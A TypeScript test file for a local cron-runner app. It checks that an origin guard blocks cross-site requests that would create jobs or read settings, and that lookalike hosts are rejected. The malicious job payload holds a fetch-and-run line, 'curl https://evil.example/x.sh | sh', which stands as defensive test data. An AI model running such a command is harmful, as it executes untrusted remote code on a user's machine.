/**
 * The attack this prevents: you visit evil.com, its JavaScript POSTs to 127.0.0.1:4747
 * without a preflight, and CronRunner runs whatever command it asked for.
 */
import { beforeEach, describe, expect, test } from "bun:test";
import type { ApiError } from "@cronrunner/shared";
import { createApp } from "../app";
import { useInMemoryDb } from "../db/db";
import { isLocalOrigin } from "../routes/guard";

const app = createApp();

beforeEach(() => {
  useInMemoryDb();
});

const maliciousJob = JSON.stringify({
  name: "pwned",
  schedule: "* * * * *",
  command: "curl https://evil.example/x.sh | sh",
});

describe("origin guard", () => {
  test("blocks a job created from another website", async () => {
    const res = await app.request("/api/jobs", {
      method: "POST",
      headers: { "content-type": "application/json", origin: "https://evil.example" },
      body: maliciousJob,
    });
    expect(res.status).toBe(403);
    expect(((await res.json()) as ApiError).error.code).toBe("forbidden_origin");
    // Nothing was created.
    expect(await (await app.request("/api/jobs")).json()).toEqual([]);
  });

  test("blocks the no-preflight form-style POST too", async () => {
    const res = await app.request("/api/jobs", {
      method: "POST",
      // text/plain is a "simple" content type, so browsers send it without a preflight.
      headers: { "content-type": "text/plain", origin: "https://evil.example" },
      body: maliciousJob,
    });
    expect(res.status).toBe(403);
  });

  test("blocks reads of settings from another website", async () => {
    const res = await app.request("/api/settings", { headers: { origin: "https://evil.example" } });
    expect(res.status).toBe(403);
  });

  test("allows the app's own origin", async () => {
    for (const origin of [
      "http://localhost:4747",
      "http://127.0.0.1:4747",
      "http://localhost:5173",
    ]) {
      const res = await app.request("/api/health", { headers: { origin } });
      expect(res.status).toBe(200);
    }
  });

  test("allows clients that send no Origin, such as curl", async () => {
    expect((await app.request("/api/health")).status).toBe(200);
  });
});

describe("isLocalOrigin", () => {
  test("accepts loopback hosts", () => {
    expect(isLocalOrigin("http://localhost:4747")).toBe(true);
    expect(isLocalOrigin("http://127.0.0.1:1234")).toBe(true);
  });

  test("rejects remote hosts and lookalikes", () => {
    for (const origin of [
      "https://evil.example",
      "http://localhost.evil.example",
      "http://127.0.0.1.evil.example",
      "https://notlocalhost",
      "null",
      "",
    ]) {
      expect(isLocalOrigin(origin)).toBe(false);
    }
  });
});
